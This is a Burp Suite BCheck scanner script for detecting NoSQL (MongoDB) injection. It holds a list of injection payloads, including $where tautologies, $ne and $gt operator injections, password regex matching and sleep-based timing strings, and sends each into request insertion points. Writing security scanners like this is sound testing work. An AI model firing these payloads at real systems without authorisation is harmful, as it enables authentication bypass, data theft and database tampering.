metadata:
    language: v2-beta
    name: "NoSQL Injection Detection"
    description: "Checks for NoSQL injection vulnerabilities using various payloads."
    author: "Kaustubh"
 # works best for GET, POST/PUT where JSON body is there wont work properly. since currently bchecks treats entire JSON body as a single insertion point, so no append the payload to individual JSON fields but to entire body 
define:
    desc = "Potential NoSQL Injection detected"
    issueRemediation = "Review and sanitize user inputs and query logic."

run for each:
    payload = 
        "true, $where: '1 == 1'",
        ", $where: '1 == 1'",
        "$where: '1 == 1'",
        "', $where: '1 == 1'",
        "1, $where: '1 == 1'",
        "{ $ne: 1 }",
        "', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'",
        "db.injection.insert({success:1});",
        "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1) } }",
        "|| 1==1",
        "' && this.password.match(/.*/)//+%00",
        "' && this.passwordzz.match(/.*/)//+%00",
        "'%20%26%26%20this.password.match(/.*/)//+%00",
        "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
        "{$gt: ''}",
        "{\"$gt\": \"\"}",
        "[$ne]=1",
        "';sleep(5000);",
        "';sleep(5000);'",
        "';sleep(5000);+'",
        "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
        "';return 'a'=='a' && ''=='",
        "\";return(true);var xyz='a",
        "0;return true"

given query or body insertion point then
  send request called check_query:
    replacing query_string: {payload}

  # Check the response for NoSQL injection in query
  if {check_query.response.status_code} is "200" or {check_query.response.status_code} is "201" then
      report issue and continue:
          severity: high
          confidence: tentative
          detail: `{desc} via query payload: {payload}`
          remediation: {issueRemediation}
  end if
